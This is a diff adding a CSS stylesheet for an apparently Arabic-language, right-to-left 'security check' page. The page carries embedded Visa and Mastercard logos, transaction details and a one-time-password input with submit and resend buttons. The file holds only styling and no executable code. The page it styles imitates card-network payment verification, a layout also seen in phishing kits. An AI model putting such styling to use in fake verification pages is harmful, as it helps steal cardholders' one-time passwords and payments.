@@ -1,0 +1,146 @@
+.security-check-visa-container {
+  font-family: 'Arial', sans-serif;
+  max-width: 100%;
+  margin: 0 auto;
+  padding: 0;
+  direction: rtl;
+  background-color: #000000;
+  color: #ffffff;
+  min-height: 100vh;
+}
+
+.header {
+  display: flex;
+  padding: 20px;
+  border-bottom: 1px solid #333;
+}
+
+.visa-logo {
+  width: 80px;
+  height: 40px;
+  background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAwIDMyNCIgZmlsbD0iIzQyNzZiOSI+PHBhdGggZD0iTTY1MS4xNjcgMjIuMTY3SDM0OC44MzNjLTEyNi4yNSAwLTIyOC43NSAxMDIuNS0yMjguNzUgMjI4Ljc1djUxLjMzM2MwIDEyNi4yNSAxMDIuNSAyMjguNzUgMjI4Ljc1IDIyOC43NWgzMDIuMzM0YzEyNi4yNSAwIDIyOC43NS0xMDIuNSAyMjguNzUtMjI4Ljc1VjI1MC45MTdjMC0xMjYuMjUtMTAyLjUtMjI4Ljc1LTIyOC43NS0yMjguNzV6TTQyNi4xNjcgMjUwLjkxN2w0MS4yNS0xOTUuODMzaDY2bC00MS4yNSAxOTUuODMzaC02NnptMzA2LjI1IDBsLTMxLTEzNi41Yy0xLjI1LTUuODMzLTYuMjUtMTIuNS0xMi41LTEyLjVoLTcyLjVsLTEuMjUgNi4yNWMwIDAgMTcuNSA0LjE2NyAzOC43NSAxMi41YzE3LjUgNi4yNSAyMy4zMzMgMTcuNSAxOS4xNjcgMjkuMTY3bC0yMi4wODQgMTAxLjA4M2g2Ni42Njd6TTUxMC4wODQgMTM5LjU4M2MwLTI1LjgzMyAyMy4zMzMtNTEuNjY3IDcyLjUtNTEuNjY3IDEyLjUgMCAyNS44MzMgMi41IDM2LjI1IDYuMjVsNi4yNS0zNy41Yy0xMi41LTQuMTY3LTI5LjE2Ny02LjI1LTQ1LTYuMjVDNTA1IDUwLjQxNyA0NDMuNzUgOTcuNSA0NDMuNzUgMTUyLjA4M2MwIDQ1IDQxLjI1IDcyLjUgNzIuNSA4Ny41YzMyLjUgMTUuODMzIDQzLjMzMyAyNi4yNSA0My4zMzMgNDAuODM0IDAgMjIuMDgzLTIwLjgzMyAzMS42NjYtNTUgMzEuNjY2LTI5LjE2NyAwLTUwLTYuMjUtNjQuMTY3LTEyLjVsLTYuMjUgMzguNzVjMTQuMTY3IDYuMjUgNDAuODM0IDEyLjUgNjguMzM0IDEyLjUgNjQuMTY2IDAgMTA2LjI1LTMxLjY2NyAxMDYuMjUtODUgMC02Ni42NjctOTguNzUtNzAuODM0LTk4Ljc1LTEyNi4yNXoiLz48L3N2Zz4=');
+  background-repeat: no-repeat;
+  background-size: contain;
+  background-position: center;
+  margin-right: 20px;
+}
+
+.mastercard-logo {
+  width: 80px;
+  height: 40px;
+  background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAwIDYyMCI+PGNpcmNsZSBjeD0iMzUwIiBjeT0iMzEwIiByPSIyMDAiIGZpbGw9IiNlYjAwMWIiLz48Y2lyY2xlIGN4PSI2NTAiIGN5PSIzMTAiIHI9IjIwMCIgZmlsbD0iI2Y3OWUxYiIvPjxwYXRoIGQ9Ik01MDAgNDYwYzU1LjIyOC00OC4yMjcgOTAtMTE5LjM0MyA5MC0yMDAgMC04MC42NTctMzQuNzcyLTE1MS43NzMtOTAtMjAwLTU1LjIyOCA0OC4yMjctOTAgMTE5LjM0My05MCAyMDAgMCA4MC42NTcgMzQuNzcyIDE1MS43NzMgOTAgMjAweiIgZmlsbD0iI2ZmNWUwMCIvPjwvc3ZnPg==');
+  background-repeat: no-repeat;
+  background-size: contain;
+  background-position: center;
+}
+
+.content {
+  display: flex;
+  flex-direction: column;
+  padding: 20px;
+  max-width: 600px;
+  margin: 0 auto;
+}
+
+.title {
+  font-size: 24px;
+  margin-bottom: 20px;
+  text-align: right;
+}
+
+.subtitle {
+  font-size: 16px;
+  color: #cccccc;
+  margin-bottom: 30px;
+  text-align: right;
+  line-height: 1.5;
+}
+
+.transaction-details {
+  background-color: #111111;
+  border-radius: 8px;
+  padding: 20px;
+  margin-bottom: 30px;
+}
+
+.detail-row {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 10px;
+}
+
+.detail-label {
+  font-weight: bold;
+}
+
+.detail-value {
+  text-align: left;
+}
+
+.otp-message {
+  font-size: 16px;
+  color: #cccccc;
+  margin-bottom: 30px;
+  text-align: right;
+  line-height: 1.5;
+}
+
+.form-group {
+  width: 100%;
+  margin-bottom: 20px;
+}
+
+.input-label {
+  display: block;
+  font-size: 16px;
+  color: #cccccc;
+  margin-bottom: 10px;
+  text-align: right;
+}
+
+.otp-input {
+  width: 100%;
+  padding: 15px;
+  border: none;
+  border-radius: 4px;
+  font-size: 16px;
+  background-color: #333333;
+  color: white;
+  outline: none;
+  text-align: center;
+}
+
+.submit-button {
+  width: 100%;
+  padding: 15px;
+  background-color: #0066cc;
+  color: white;
+  border: none;
+  border-radius: 4px;
+  font-size: 18px;
+  font-weight: bold;
+  cursor: pointer;
+  margin-bottom: 20px;
+  transition: background-color 0.3s;
+}
+
+.submit-button:hover {
+  background-color: #0052a3;
+}
+
+.resend-button {
+  background: none;
+  border: none;
+  color: #4276b9;
+  font-size: 16px;
+  cursor: pointer;
+  text-align: center;
+  margin: 0 auto;
+  padding: 10px;
+  text-decoration: underline;
+  transition: color 0.3s;
+}
+
+.resend-button:hover {
+  color: #2c5aa0;
+}
